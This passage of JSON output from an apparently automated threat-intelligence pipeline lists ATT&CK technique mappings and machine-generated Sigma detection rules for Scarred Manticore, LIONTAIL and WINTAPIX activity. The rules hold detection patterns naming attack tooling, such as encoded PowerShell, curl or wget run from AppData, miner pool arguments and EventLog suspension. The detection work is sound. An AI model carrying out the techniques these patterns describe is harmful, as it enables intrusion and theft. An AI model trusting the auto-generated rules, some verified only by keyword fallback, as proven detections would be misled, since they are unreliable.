            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "7d1089d4-3a58-4cda-9ba9-596dd5a78d3b",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "85234454-79df-4bb3-9f49-1354ae549893",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "0f78d72c-dada-4356-bcfb-7b3fd375a364",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "57d77f05-9993-4c20-8e81-1abc5f48fa41",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "8f826ff0-b280-45a8-9570-8ebad043ca82",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "3121007b-151b-4f9b-b11a-ba42dfc59b16",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "4a1464de-8643-4583-bfd7-463b43f50ba5",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Account Discovery",
            "attack_id": "T1087",
            "tactic": "Discovery",
            "description": "Detected Account Discovery activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "f94444c1-6b70-4c38-923a-2ab8a2cb883b",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "8b6bf09c-26a1-4703-b453-66a293b550be",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Remote Desktop Protocol",
            "attack_id": "T1021.001",
            "tactic": "Lateral Movement",
            "description": "Detected Remote Desktop Protocol activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b138d48b-7ae0-449d-9e69-335aafd0798d",
            "report_id": "pdf-795a10436052f4588088b76c772a703c",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "SystemInfo",
              "Sc",
              "at",
              "shellcode",
              "xor",
              "ping",
              "cmd",
              "base64",
              "reg",
              "obfuscator",
              "sc.exe",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          }
        ]
      }
    ]
  },
  "rules": {
    "rules": [
      {
        "title": "Suspicious Web Server Spawning Shell with HTTP Tunneling Parameters",
        "description": "Detects a web server process spawning a command shell with command line arguments indicative of HTTP protocol tunneling, as seen in Tunna web shell activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": null
        },
        "detection": {
          "selection_parent": {
            "ParentImage|endswith": "\\w3wp.exe"
          },
          "selection_image": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "selection_cli_http": {
            "CommandLine|contains": "http"
          },
          "selection_cli_port": {
            "CommandLine|contains": " -p "
          },
          "condition": "selection_parent and selection_image and selection_cli_http and selection_cli_port"
        },
        "falsepositives": [
          "Legitimate administrative scripts using HTTP connectivity with explicit port parameters",
          "Web server maintenance utilities that invoke shells with network parameters"
        ],
        "level": "high",
        "tags": [
          "attack.t1090"
        ],
        "ttp_id": "unknown",
        "technique_name": "Protocol Tunneling",
        "generation_method": "langchain",
        "id": "1ba8bf74-0a58-4198-9550-fb2cacc3a0f2",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 28,
          "query_time_ms": 414.00000000000006
        }
      },
      {
        "title": "Suspicious .NET Payload Execution via Shellcode with HTTP.sys Interaction",
        "description": "Detects potential execution of encrypted .NET payloads via shellcode that interacts directly with HTTP.sys driver by monitoring for suspicious command-line patterns in .NET host processes.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": null
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\regsvcs.exe",
              "\\regasm.exe",
              "\\rundll32.exe",
              "\\msbuild.exe",
              "\\csc.exe"
            ],
            "CommandLine|contains": [
              "shellcode",
              "encrypted",
              "HTTP.sys",
              "NET payload"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate .NET assembly compilation or registration by developers or system administrators",
          "Use of .NET tools for legitimate automation or debugging"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "6110405c-02b1-4d82-88f5-82c53f2ca0fe",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 3,
          "query_time_ms": 512.0
        }
      },
      {
        "title": "Potential Data Exfiltration from Local System via Command-Line Tool",
        "description": "Detects potential data exfiltration activity, particularly email exfiltration, from local system using command-line tools. Based on behavioral patterns observed in threats like Scarred Manticore targeting government and organizational networks.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\pwsh.exe"
            ],
            "CommandLine|contains": [
              "email",
              "mail",
              "export",
              "outlook",
              "exfiltrate",
              "compress",
              "archive"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts that export email or user data",
          "Backup or archival tools processing user mail profiles",
          "System maintenance scripts involving data compression and transfer"
        ],
        "level": "medium",
        "tags": [
          "attack.collection",
          "attack.t1005",
          "custom.windows",
          "custom.data_exfiltration"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data from Local System",
        "generation_method": "langchain",
        "id": "49dc7189-e520-430a-86da-c52e0758a5d8",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 22,
          "query_time_ms": 1088.0
        }
      },
      {
        "title": "Obfuscated .NET Payload Execution via Commercial Obfuscator",
        "description": "Detects execution of obfuscated .NET payloads potentially using commercial obfuscation tools by identifying suspicious process creation patterns associated with .NET utilities and obfuscated command lines.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_msbuild": {
            "Image|endswith": "\\msbuild.exe"
          },
          "selection_csc": {
            "Image|endswith": "\\csc.exe"
          },
          "selection_vbc": {
            "Image|endswith": "\\vbc.exe"
          },
          "selection_ambiguous": {
            "CommandLine|contains": [
              "-enc",
              "Base64",
              "--obfuscate",
              "--compress",
              "--encrypt"
            ]
          },
          "condition": "(selection_msbuild or selection_csc or selection_vbc) and selection_ambiguous"
        },
        "falsepositives": [
          "Legitimate software builds using MSBuild or C# compiler with encryption or compression arguments",
          "Development or CI/CD environments executing .NET compilation with encoded parameters"
        ],
        "level": "high",
        "tags": [
          "attack.defense-evasion",
          "attack.t1027"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "95c7a40b-24bb-4dc4-aed9-a1f4675a7065",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 1,
          "query_time_ms": 381.0
        }
      },
      {
        "title": "Liontail Framework Implant Customization and Application Window Discovery",
        "description": "Detects command line indicators of Liontail Framework usage for implant customization and application window discovery.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": null
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": [
              "LIONTAIL",
              "implant"
            ]
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative tools using similar command-line parameters",
          "Developers testing custom implants"
        ],
        "level": "high",
        "tags": [
          "attack.t1010",
          "attack.discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Window Discovery",
        "generation_method": "langchain",
        "id": "52ed72a6-6d1e-4a1d-9398-53781da2f786",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 31,
          "query_time_ms": 429.0
        }
      },
      {
        "title": "Suspicious Exfiltration Over C2 Channels via PowerShell",
        "description": "Detects potential data exfiltration over command and control channels using PowerShell with large outbound transfers on common C2 ports",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_network": {
            "DestinationPort|in": [
              80,
              8080,
              53
            ],
            "BytesSent|gt": 1000000,
            "Image|endswith": "\\powershell.exe"
          },
          "selection_private_ips": {
            "DestinationIp|cidr": [
              "10.0.0.0/8",
              "172.16.0.0/12",
              "192.168.0.0/16",
              "169.254.0.0/16"
            ]
          },
          "condition": "selection_network and not selection_private_ips"
        },
        "falsepositives": [
          "Legitimate administrative file transfers using PowerShell",
          "Approved bulk DNS-over-TCP communications"
        ],
        "level": "high",
        "tags": [
          "attack.t1048",
          "attack.exfiltration"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Command and Control Channel",
        "generation_method": "langchain",
        "id": "5bd2743d-da59-4e54-87ab-68b32f1786f2",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 4,
          "query_time_ms": 1241.0
        }
      },
      {
        "title": "Detect Execution of Custom DLL Backdoors, Web Shells, and Driver Implants",
        "description": "Detects process creation events where legitimate Windows utilities are used to load custom DLL backdoors, execute web shells, or install driver-based implants associated with the Scarred Manticore group.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_dll": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": ".dll"
          },
          "selection_regsvr": {
            "Image|endswith": "\\regsvr32.exe",
            "CommandLine|contains": ".dll"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "selection_driver": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": ".sys"
          },
          "selection_webshell": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "webshell"
          },
          "condition": "selection_dll or selection_regsvr or selection_powershell or selection_driver or selection_webshell"
        },
        "falsepositives": [
          "Legitimate administration using sc.exe to install or start signed drivers",
          "System maintenance scripts that invoke regsvr32.exe or rundll32.exe with valid DLLs",
          "PowerShell scripts that use -EncodedCommand for obfuscation in legitimate deployments",
          "Automation tools that run cmd.exe with the word \"webshell\" as part of a benign path or variable name"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1204",
          "attack.t1055"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution",
        "generation_method": "langchain",
        "id": "19805a2c-1734-4213-87d6-c23da0217a76",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 27,
          "query_time_ms": 487.0
        }
      },
      {
        "title": "Process Discovery via WINTAPIX driver or enumeration commands",
        "description": "Detects execution of the WINTAPIX driver or commands that enumerate user-mode processes, indicating attempts to locate a process with local SYSTEM privileges.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_driver": {
            "Image|contains": "WINTAPIX"
          },
          "selection_enumeration": {
            "CommandLine|contains": [
              "tasklist",
              "Get-Process",
              "wmic process",
              "pslist"
            ]
          },
          "condition": "selection_driver or selection_enumeration"
        },
        "falsepositives": [
          "Legitimate administrative scripts using tasklist or Get-Process",
          "System monitoring tools that enumerate processes (e.g., Process Explorer, PowerShell scripts)",
          "Security software that loads drivers with names containing \"WINTAPIX\" for benign purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1057",
          "custom.process_discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Discovery",
        "generation_method": "langchain",
        "id": "75da819e-8ca0-432d-92a8-8243adce0533",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 95,
          "query_time_ms": 450.0
        }
      },
      {
        "title": "Web Server Process Creating Suspicious DLLs",
        "description": "Detects web server processes creating wlanapi.dll or wlbsctrl.dll in non-system directories, which may indicate exploitation of missing DLLs to install a backdoor.",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "TargetFilename|endswith": [
              "\\wlanapi.dll",
              "\\wlbsctrl.dll"
            ],
            "Image|endswith": [
              "\\w3wp.exe",
              "\\httpd.exe",
              "\\nginx.exe",
              "\\tomcat.exe"
            ]
          },
          "filter": {
            "TargetFilename|contains": [
              "\\System32\\",
              "\\Windows\\"
            ]
          },
          "condition": "selection and not filter"
        },
        "falsepositives": [
          "Legitimate web server modules/plugins installing these DLLs (rare)",
          "Administrative actions modifying system files"
        ],
        "level": "high",
        "tags": [
          "attack.t1190",
          "attack.initial_access"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "langchain",
        "id": "4427e28e-f35f-4eab-9c31-6e4b9c9ef282",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 69,
          "query_time_ms": 449.0
        }
      },
      {
        "title": "System Information Discovery via Memory and Registry Query",
        "description": "Detects potential system information discovery by monitoring for processes that query physical memory or registry keys using known command-line patterns and system utilities.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_memory": {
            "CommandLine|contains": [
              "GetPhysicallyInstalledSystemMemory",
              "wmic memorychip",
              "systeminfo",
              "powershell",
              "Get-CimInstance",
              "Win32_PhysicalMemory"
            ]
          },
          "selection_registry": {
            "CommandLine|contains": [
              "NtOpenKey",
              "reg query",
              "powershell",
              "Get-ItemProperty",
              "Get-ChildItem",
              "\\SOFTWARE\\",
              "\\\\HARDWARE\\"
            ]
          },
          "condition": "selection_memory or selection_registry"
        },
        "falsepositives": [
          "Administrative use of wmic, systeminfo, or PowerShell for system diagnostics",
          "Software inventory or compliance tools querying system memory and registry",
          "System administrators running PowerShell scripts for configuration"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.T1082"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Information Discovery",
        "generation_method": "langchain",
        "id": "7e0987e4-2b23-483e-8c2f-0e3646ea48f5",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 7,
          "query_time_ms": 458.0
        }
      },
      {
        "title": "Windows Service Search Order Hijacking via Suspicious Process",
        "description": "Detects processes spawned by Windows services with images or command lines indicating potential search order hijacking in writable directories.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_parent": {
            "ParentImage|endswith": [
              "services.exe",
              "svchost.exe"
            ]
          },
          "selection_image": {
            "Image|contains": [
              "\\appdata\\",
              "\\temp\\",
              "\\public\\",
              "\\programdata\\"
            ]
          },
          "selection_cmd_dll": {
            "CommandLine|contains": ".dll"
          },
          "selection_cmd_paths": {
            "CommandLine|contains": [
              "\\appdata\\",
              "\\temp\\",
              "\\public\\",
              "\\programdata\\"
            ]
          },
          "condition": "selection_parent and (selection_image or (selection_cmd_dll and selection_cmd_paths))"
        },
        "falsepositives": [
          "Legitimate software installations or updates executed from user writable directories.",
          "Third-party applications using non-standard directories for DLL loading."
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1574.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "Hijack Execution Flow",
        "generation_method": "langchain",
        "id": "c8fe03f5-4cb9-4b48-9a5b-791271976077",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 5,
          "query_time_ms": 374.0
        }
      },
      {
        "title": "Suspension of EventLog Service Threads",
        "description": "Detects attempts to bypass Windows Event Logging by suspending or stopping the EventLog service using sc.exe or PowerShell thread\u2011suspension commands.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains|regex": "eventlog"
          },
          "selection_ps": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains|regex": "(Suspend-Thread.*eventlog|eventlog.*Suspend-Thread)"
          },
          "condition": "selection_sc or selection_ps"
        },
        "falsepositives": [
          "Legitimate administrators stopping the Windows Event Log service for maintenance",
          "PowerShell scripts that intentionally suspend threads of the EventLog service for troubleshooting",
          "Use of sc.exe by IT staff to configure or disable the EventLog service in controlled environments"
        ],
        "level": "high",
        "tags": [
          "attack.t1562",
          "attack.defense_evasion",
          "attack.impair_defenses"
        ],
        "ttp_id": "unknown",
        "technique_name": "Impair Defenses",
        "generation_method": "langchain",
        "id": "48233f90-545c-4d4d-838d-0ca27bcd4cc5",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 9,
          "query_time_ms": 585.0
        }
      },
      {
        "title": "Detection of Custom Deployment Tool Using Open\u2011Source Components",
        "description": "Detects execution of a custom\u2011written component (identified by its location in user profile directories) that launches a known open\u2011source utility, indicating possible use of software deployment tools as described in ATT&CK T1072.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "custom_component": {
            "Image|contains": "\\AppData\\",
            "Image|endswith": ".exe"
          },
          "opensource_git": {
            "Image|endswith": "git.exe"
          },
          "opensource_curl": {
            "Image|endswith": "curl.exe"
          },
          "opensource_wget": {
            "Image|endswith": "wget.exe"
          },
          "opensource_python": {
            "Image|endswith": "python.exe"
          },
          "opensource_node": {
            "Image|endswith": "node.exe"
          },
          "condition": "custom_component and (opensource_git or opensource_curl or opensource_wget or opensource_python or opensource_node)"
        },
        "falsepositives": [
          "Legitimate user\u2011installed applications that reside in %APPDATA% or %TEMP% and legitimately invoke open\u2011source tools (e.g., development environments, package managers).",
          "Automation scripts or build pipelines that run from user profile locations and use tools like git or curl."
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1072"
        ],
        "ttp_id": "unknown",
        "technique_name": "Software Deployment Tools",
        "generation_method": "langchain",
        "id": "da8613c1-ca70-46ec-9ad0-0470b1336556",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 106,
          "query_time_ms": 545.0
        }
      },
      {
        "title": "WINTAPIX Driver Load Detection",
        "description": "Detects the loading of WINTAPIX driver in the kernel, indicating potential persistence via Boot or Logon Autostart Execution (T1547)",
        "logsource": {
          "category": "driver_load",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image": "WINTAPIX"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate WINTAPIX driver loads for non-malicious purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1547",
          "custom.mitre_boot_or_logon_autostart_execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "Boot or Logon Autostart Execution",
        "generation_method": "langchain",
        "id": "9a0f720a-0980-40f1-8831-184c10b094c4",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 1,
          "query_time_ms": 427.0
        }
      },
      {
        "title": "PowerShell Base64 Encoded Command Execution",
        "description": "Detects PowerShell execution with base64 encoded commands commonly used by attackers to obfuscate scripts. Matches T1059.001 with references to MITRE ATT&CK.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains|any": [
              "-enc",
              "-EncodedCommand"
            ],
            "CommandLine|re": "[A-Za-z0-9+/]{20,}="
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts using encoded commands",
          "Deployment tools like SCCM or Ansible using -enc",
          "Benign use of base64 encoded commands in scripts"
        ],
        "level": "high",
        "tags": [
          "attack.t1059.001",
          "attack.execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "a891309b-35d5-4d25-9083-8d8d9d4a7c3d",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 7,
          "query_time_ms": 955.0000000000001
        }
      },
      {
        "title": "Suspicious Process Spawned from ClientBin.aspx Web Request",
        "description": "Detects potential lateral movement via remote services by identifying processes spawned from a web request to ClientBin.aspx, which may indicate exploitation of a web shell or remote execution endpoint.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_parent": {
            "ParentCommandLine|contains": "ClientBin.aspx"
          },
          "selection_child": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\rundll32.exe",
              "\\regsvr32.exe"
            ]
          },
          "selection_mining": {
            "CommandLine|contains": [
              "-o stratum",
              "--url",
              "xmr",
              "miner",
              "--algo",
              "--pool"
            ]
          },
          "selection_port": {
            "DestinationPort|gte": 3000
          },
          "condition": "selection_parent and selection_child and (selection_mining or selection_port)"
        },
        "falsepositives": [
          "Legitimate administrative scripts triggered via web applications containing 'ClientBin.aspx' in the command line (rare)",
          "Internal monitoring tools that invoke command-line utilities through IIS-hosted endpoints"
        ],
        "level": "high",
        "tags": [
          "attack.t1021",
          "attack.lateral_movement"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Services",
        "generation_method": "langchain",
        "id": "f16b5d22-94cf-442a-9148-df7e0f791bd3",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 29,
          "query_time_ms": 413.00000000000006
        }
      },
      {
        "title": "Suspicious Registry Modification for Persistence via ServerManager",
        "description": "Detects modification of registry keys associated with ServerManager using common attack processes, indicating potential persistence mechanisms.",
        "logsource": {
          "category": "registry_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_reg": {
            "EventID": 13,
            "TargetObject|contains": "ServerManager"
          },
          "selection_process": {
            "Image|endswith": [
              "\\powershell.exe",
              "\\cmd.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe",
              "\\reg.exe"
            ]
          },
          "condition": "selection_reg and selection_process"
        },
        "falsepositives": [
          "Legitimate administrative activity using regedit or command-line utilities to modify ServerManager registry keys."
        ],
        "level": "high",
        "tags": [
          "attack.persistence",
          "attack.t1112"
        ],
        "ttp_id": "unknown",
        "technique_name": "Modify Registry",
        "generation_method": "langchain",
        "id": "f84a50d5-2df7-4ba4-b528-dfb5b47282ea",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 23,
          "query_time_ms": 591.0
        }
      },
      {
        "title": "Create/Modify System Process via Service Utilities",
        "description": "Detects service creation/modification using PowerShell, sc.exe, or WMI through command-line patterns",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "ParentImage|endswith": [
              "\\wmiprvse.exe",
              "\\powershell.exe",
              "\\cmd.exe"
            ],
            "Image|endswith": [
              "\\powershell.exe",
              "\\cmd.exe",
              "\\sc.exe",
